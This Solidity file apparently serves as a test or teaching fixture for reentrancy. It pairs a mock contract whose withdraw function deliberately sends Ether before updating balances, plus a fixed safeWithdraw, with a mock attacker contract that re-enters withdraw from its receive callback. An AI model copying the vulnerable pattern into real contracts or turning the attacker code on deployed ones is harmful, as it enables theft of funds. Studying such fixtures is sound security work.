// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract MockVulnerable {
    mapping(address => uint256) public balances;
    
    event Deposited(address indexed user, uint256 amount);
    event Withdrawn(address indexed user, uint256 amount);
    
    function deposit() external payable {
        balances[msg.sender] += msg.value;
        emit Deposited(msg.sender, msg.value);
    }
    
    function withdraw(uint256 _amount) external {
        require(balances[msg.sender] >= _amount, "Insufficient balance");
        
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Transfer failed");
        
        balances[msg.sender] -= _amount;
        emit Withdrawn(msg.sender, _amount);
    }
    
    function safeWithdraw(uint256 _amount) external {
        require(balances[msg.sender] >= _amount, "Insufficient balance");
        
        balances[msg.sender] -= _amount;
        
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Transfer failed");
        
        emit Withdrawn(msg.sender, _amount);
    }
    
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract MockMalicious {
    MockVulnerable public target;
    uint256 public attackCount;
    
    constructor(address _target) {
        target = MockVulnerable(_target);
    }
    
    function executeReentrancy(uint256 _amount) external {
        attackCount++;
        target.withdraw(_amount);
    }
    
    receive() external payable {
        if (attackCount < 5 && address(target).balance >= msg.value) {
            attackCount++;
            target.withdraw(msg.value);
        }
    }
    
    function simulateAttack() external {
        attackCount++;
    }
}